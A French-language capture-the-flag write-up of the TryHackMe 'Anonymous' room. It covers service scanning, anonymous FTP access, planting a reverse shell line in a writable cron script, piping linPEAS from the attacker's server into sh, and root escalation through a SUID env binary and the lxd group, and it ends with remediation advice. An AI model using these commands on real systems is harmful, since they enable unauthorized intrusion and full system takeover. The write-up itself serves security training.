# Anonymous

CTF : **tryHackMe - Anonymous**

## nmap

La reconnaissance commence par un scan nmap classique avec '`-sV`' (service/version) et '`-sC`' (équivalent à --script=default):

| Port | Service | Product | Version | Extra Info |
| --- | --- | --- | --- | --- |
| 21  | ftp | vsftpd | 2.0.8 or later |     |
| 22  | ssh | OpenSSH | 7.6p1 Ubuntu 4ubuntu0.3 | Ubuntu Linux; protocol 2.0 |
| 139 | netbios-ssn | Samba smbd | 3.X - 4.X | workgroup: WORKGROUP |
| 445 | netbios-ssn | Samba smbd | 4.7.6-Ubuntu | workgroup: WORKGROUP |

<details close="">
	<summary>initialScan_output</summary>

```nmap
# Nmap 7.93 scan initiated Fri Mar 17 04:26:19 2023 as: nmap -sC -sV -oA nmap/initialScan 10.10.239.226
Nmap scan report for 10.10.239.226
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.48.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-03-17T08:26:35
|_  start_date: N/A
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-03-17T08:26:35+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 17 04:26:39 2023 -- 1 IP address (1 host up) scanned in 19.55 seconds

```
</details> 

# FTP

Connection au service FTP :

<details open=""><summary>Creds:</summary>

- ftp:*&lt;empty_password&gt;*
- anonymous:*&lt;empty_password&gt;*

</details>

```
$ ftp ftp@10.10.239.226
Connected to 10.10.239.226.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```
ftp> ls
229 Entering Extended Passive Mode (|||64063|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
```

```
ftp> cd scripts
250 Directory successfully changed.
```

```
ftp> ls
229 Entering Extended Passive Mode (|||6163|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1548 Mar 17 08:39 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Téléchargement des fichiers :

```
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||63955|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |********************************************************************************************|   314       88.19 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (8.86 KiB/s)

ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||32518|)
150 Opening BINARY mode data connection for removed_files.log (1548 bytes).
100% |********************************************************************************************|  1548       54.67 MiB/s    00:00 ETA
226 Transfer complete.
1548 bytes received in 00:00 (48.54 KiB/s)

ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||48514|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |********************************************************************************************|    68        0.78 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.57 KiB/s)
```

- removed_files.log
    
    ```
    $ cat removed_files.log            
    ```
    
    ```bash
    Running cleanup script:  nothing to delete
    Running cleanup script:  nothing to delete
    Running cleanup script:  nothing to delete
    Running cleanup script:  nothing to delete
    Running cleanup script:  nothing to delete
    ```
    
- to_do.txt
    
    ```bash
    $ cat to_do.txt 
    ```
    
    ```txt
    I really need to disable the anonymous login...it's really not safe
    ```
    
- clean.sh
    
    ```bash
    $ cat clean.sh
    ```
    
    ```
    #!/bin/bash
    
    tmp_files=0
    echo $tmp_files
    if [ $tmp_files=0 ]
    then
            echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
    else
        for LINE in $tmp_files; do
            rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
    fi
    ```
    
    > Ce script est un script Bash qui sert à nettoyer les fichiers temporaires stockés dans le répertoire "/tmp" d'un système Linux.
    

Nous allons essayer d'éditer ce script pour ajouter une commande et obtenir un reverse shell :

```
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.18.48.143/1337 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

Nous allons maintenant pourvoir uploader notre script clean.sh modifié.

```
ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||9511|)
150 Ok to send data.
100% |********************************************************************************************|   362        6.63 MiB/s    00:00 ETA
226 Transfer complete.
362 bytes sent in 00:00 (5.66 KiB/s)
```

```
ftp> ls
229 Entering Extended Passive Mode (|||56385|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          362 Mar 17 10:19 clean.sh
-rw-rw-r--    1 1000     1000         5848 Mar 17 10:19 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Lancement de **netcat** pour recevoir le reverse Shell :

```bash
$ nc -lnvp 1337                     
listening on [any] 1337 ...
connect to [10.18.48.143] from (UNKNOWN) [10.10.239.226] 46560
bash: cannot set terminal process group (1760): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Nous avons un reverse shell, mais il n'est pas très fonctionnel.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
namelessone@anonymous:~$
```

```bash
namelessone@anonymous:~$ ^Z
[1]+  Stopped                 nc -lnvp 1337
```

> `^Z` : Ctrl + Z

```bash
$ stty raw -echo;fg
```

```bash
namelessone@anonymous:~$ export TERM=xterm
```

Maintenant nous avons un reverse shell fonctionnel.

```
namelessone@anonymous:~$ ls -la
total 60
drwxr-xr-x 6 namelessone namelessone 4096 May 14  2020 .
drwxr-xr-x 3 root        root        4096 May 11  2020 ..
lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo
-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts
```

* * *

# USER FLAG

```bash
namelessone@anonymous:~$ cat user.txt 
<***USER_FLAG***>
```

* * *

# Privilege Escalation

## linPeas

Nous allons utiliser le script [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

- téléchargez le script sur notre machine.
    
    ```bash
    $ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
    ```
    
    ```bash
    $ ls                         
    linpeas.sh
    ```
    
- On note notre adresse IP
    
    ```bash
    $ ifconfig tun0              
    tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
            inet 10.18.48.143  netmask 255.255.128.0  destination 10.18.48.143
            inet6 fe80::5351:6ad5:1c3f:ab52  prefixlen 64  scopeid 0x20<link>
            unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
            RX packets 99  bytes 8127 (7.9 KiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 130  bytes 7454 (7.2 KiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    
    ```
    
- On lance le serveur sur notre machine
    
    ```bash
    $ python3 -m http.server 4444
    Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
    ```
    
- On lance le script linPEAS
    
    ```bash
    namelessone@anonymous:~$ curl -L http://10.18.48.143:4444/linpeas.sh | sh
    ```
    

#### linPEAS output

![linpeas_usersInformation.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Anonymous/_resources/linpeas_usersInformation.png)

![linpeas_interestingFiles_env.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Anonymous/_resources/linpeas_interestingFiles_env.png)

Nous avons découvert deux informations intéressantes surlignées en jaune (*99% PE vector*):
\- /usr/bin/env
\- lxd

Nous avons donc deux vecteurs possibles pour élever nos privilèges :

# Option # 1

```bash
-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
```

Regardons sur le site [gtfio](https://gtfobins.github.io/gtfobins/env/) :

![gtfobins_env.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Anonymous/_resources/gtfobins_env.png)

Nous allons utiliser la commande `/usr/bin/env /bin/sh -p` qui devrait nous permettre de lancer un shell Bash avec les privilèges root .
Le `sh` est un interpréteur de commandes de type Unix/Linux, tandis que le `/usr/bin/env` est une commande qui permet d'exécuter un programme en cherchant d'abord dans les chemins spécifiés dans la variable d'environnement PATH.
Le `-p` permet de lancer le shell avec les privilèges de l'utilisateur root.
Exploitation :

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# whoami
root
```

Bien joué, nous voilà root !

```bash
# ls
pics  user.txt
# cd /root/     
# ls
root.txt
```

```bash
# cat root.txt
<***ROOT_FLAG***>

```

* * *

# Option #2

![linpeas_usersInformation.png](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Anonymous/_resources/linpeas_usersInformation.png)

Dans le rapport de linPEAS nous avons vu que **LXD** était surligné en jaune (*99% PE vector*).
Le site [Wiki ubuntu](https://doc.ubuntu-fr.org/lxc) nous renseigne dessus :

> *" LXC est l'acronyme de l'anglicisme **L**inu**X** **C**ontainers, est un système de virtualisation, utilisant l'isolation comme méthode de cloisonnement au niveau du système d'exploitation.*
> *Il est utilisé pour faire fonctionner des environnements Linux isolés les uns d des autres dans des conteneurs partageant le même noyau.*
> *Le conteneur apporte une virtualisation de l'environnement d'exécution (processeur, mémoire vive, réseau, système de fichier…) et non pas de la machine.*
> *Pour cette raison, on parle de « conteneur » et non de « machine virtuelle ». Veillez à ne pas confondre LXC et LXD, en effet, LXD est une surcouche logicielle à LXC. LXD est développé par Canonical pour simplifier la manipulation de vos conteneurs. "*

<details close=""><summary>$ lxc --help</summary>

```bash
namelessone@anonymous:~$ lxc --help
Description:
  Command line client for LXD

  All of LXDs features can be driven through the various commands below.
  For help with any of those, simply call them with --help.

Usage:
  lxc [command]

Available Commands:
  alias       Manage command aliases
  cluster     Manage cluster members
  config      Manage container and server configuration options
  console     Attach to container consoles
  copy        Copy containers within or in between LXD instances
  delete      Delete containers and snapshots
  exec        Execute commands in containers
  file        Manage files in containers
  help        Help about any command
  image       Manage images
  info        Show container or server information
  launch      Create and start containers from images
  list        List containers
  move        Move containers within or in between LXD instances
  network     Manage and attach containers to networks
  operation   List, show and delete background operations
  profile     Manage profiles
  publish     Publish containers as images
  remote      Manage the list of remote servers
  rename      Rename containers and snapshots
  restart     Restart containers
  restore     Restore containers from snapshots
  snapshot    Create container snapshots
  start       Start containers
  stop        Stop containers
  storage     Manage storage pools and volumes
  version     Show local and remote versions

Flags:
      --all           Show less common commands
      --debug         Show all debug messages
      --force-local   Force using the local unix socket
  -h, --help          Print help
  -v, --verbose       Show all information messages
      --version       Print version number

Use "lxc [command] --help" for more information about a command.

```
</details> 

Après quelques recherches sur internet, on peut trouver une procédure qui explique comment élever nos privilèges avec **lxc** : [hacktricks - lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

#### Exploitation :

- Installation et création du container sur notre machine :
    
    ```bash
    sudo apt update
    sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
    ```
    
    ```bash
    git clone https://github.com/lxc/distrobuilder
    ```
    
    ```bash
    cd distrobuilder
    make
    ```
    
    ```bash#Prepare
    mkdir -p $HOME/ContainerImages/alpine/
    cd $HOME/ContainerImages/alpine/
    wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
    ```
    
    ```bash#Create
    sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
    ```
    
- Téléchargement des fichiers **lxd.tar.xz** et **rootfs.squashfs** :
    
    ```bash
    namelessone@anonymous:~$ wget http://10.18.48.143:9090/lxd.tar.xz
    --2023-03-17 11:18:30--  http://10.18.48.143:9090/lxd.tar.xz
    Connecting to 10.18.48.143:9090... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 868 [application/x-xz]
    Saving to: ‘lxd.tar.xz’
    
    lxd.tar.xz          100%[===================>]     868  --.-KB/s    in 0s      
    
    2023-03-17 11:18:30 (89.5 MB/s) - ‘lxd.tar.xz’ saved [868/868]
    ```
    
    ```bash
    namelessone@anonymous:~$ wget http://10.18.48.143:9090/rootfs.squashfs
    --2023-03-17 11:18:55--  http://10.18.48.143:9090/rootfs.squashfs
    Connecting to 10.18.48.143:9090... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 2052096 (2.0M) [application/octet-stream]
    Saving to: ‘rootfs.squashfs’
    
    rootfs.squashfs     100%[===================>]   1.96M  4.23MB/s    in 0.5s    
    
    2023-03-17 11:18:55 (4.23 MB/s) - ‘rootfs.squashfs’ saved [2052096/2052096]
    ```
    
- Ajout de l'image **alpine** :
    
    ```bash
    ineelessone@anonymous:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine 
    ```
    
- On affiche les images disponibles pour vérifier si **alpine** est bien présente :
    
    ```bash
    namelessone@anonymous:~$ lxc image list
    +--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
    | ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
    +--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
    | alpine | 1e6608e33142 | no     | Alpinelinux 3.8 x86_64 (20230317_1116) | x86_64 | 1.96MB | Mar 17, 2023 at 11:19am (UTC) |
    +--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
    namelessone@anonymous:~$ 
    
    ```
    
- On configure le pool de stockage :
    
    ```bash
    namelessone@anonymous:~$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: no 
    Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
    Name of the new storage pool [default=default]:    
    Name of the storage backend to use (btrfs, dir) [default=btrfs]: dir
    Would you like to connect to a MAAS server? (yes/no) [default=no]: 
    Would you like to create a new local network bridge? (yes/no) [default=yes]: 
    What should the new bridge be called? [default=lxdbr0]: 
    What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none
    Would you like LXD to be available over the network? (yes/no) [default=no]: no
    Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
    Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
    namelessone@anonymous:~$ 
    
    ```
    
- On lance le container :
    
    ```bash
    namelessone@anonymous:~$ lxc init alpine privesc -c security.privileged=true
    ```
    
    ```bash
    / # whoami
    root
    ```
    
    Bien joué, nous voilà **root** !
    

Pour afficher le contenu du dossier **/root**, il faut se rendre dans '**/mnt/root**' :

```bash
/ # ls
bin    etc    lib    mnt    root   sbin   sys    usr
dev    home   media  proc   run    srv    tmp    var
```

```bash
/ # cd mnt/root/
```

```bash
/mnt/root # ls 
bin         etc         lost+found  proc        snap        tmp
boot        home        media       root        srv         usr
cdrom       lib         mnt         run         swap.img    var
dev         lib64       opt         sbin        sys
```

```bash
/mnt/root # ls root/
root.txt
```

```bash
/mnt/root # cat root/root.txt 
<***ROOT_FLAG***>
```

* * *

# FIX

1.  **FTP** :
    
    - Désactiver l'accès anonyme au serveur FTP ou configurer le serveur pour restreindre les accès anonymes uniquement aux répertoires autorisés.
    - Restreindre l'accès au dossier des scripts pour les utilisateurs non autorisés.
    - Utiliser un contrôle de version pour enregistrer toutes les modifications apportées aux fichiers de script.
2.  **SUID** :
    
    - Restreindre l'accès à la commande `sudo` et vérifier les droits accordés aux utilisateurs
        
        > Si un utilisateur est autorisé à utiliser la commande `sudo`, il peut exécuter des commandes avec des privilèges élevés.
        > Par conséquent, il est important de vérifier les droits accordés aux utilisateurs et de limiter l'accès à la commande `sudo` uniquement aux utilisateurs qui en ont besoin.
        
    - Configurer [SELinux](https://fr.wikipedia.org/wiki/SELinux) et [AppArmor](https://doc.ubuntu-fr.org/apparmor) (mécanismes de sécurité qui permettent de restreindre les actions qu'un processus peut effectuer).
        
3.  **LXC** :
    
    - Configurer [SELinux](https://fr.wikipedia.org/wiki/SELinux) et [AppArmor](https://doc.ubuntu-fr.org/apparmor)
        
    - Configurer les comptes d'utilisateurs avec les privilèges les plus bas nécessaires pour effectuer leurs tâches.
        
        > Dans le cas spécifique de l'élévation de privilèges avec lxd/lxc, cela signifie qu'il est important de configurer les comptes d'utilisateurs avec les privilèges les plus bas nécessaires pour effectuer leurs tâches.
        > En d'autres termes, les comptes d'utilisateurs ne devraient pas avoir plus de privilèges qu'ils n'en ont besoin pour effectuer leur travail.
        > Par exemple, si un utilisateur a seulement besoin d'accéder à un dossier spécifique sur le système, il ne devrait pas avoir de privilèges administratifs complets.
        > En revanche, si un utilisateur a besoin de gérer des conteneurs LXC, il pourrait être configuré avec des privilèges plus élevés, mais seulement pour les tâches spécifiques qu'il doit effectuer.
        > En général, il est préférable de configurer des comptes utilisateur avec les privilèges les plus bas possibles pour effectuer leurs tâches, puis de leur accorder des privilèges supplémentaires au fur et à mesure de leurs besoins.
        > Cela aide à minimiser les risques d'exploitation de failles de sécurité et à protéger les systèmes contre les attaques potentielles.
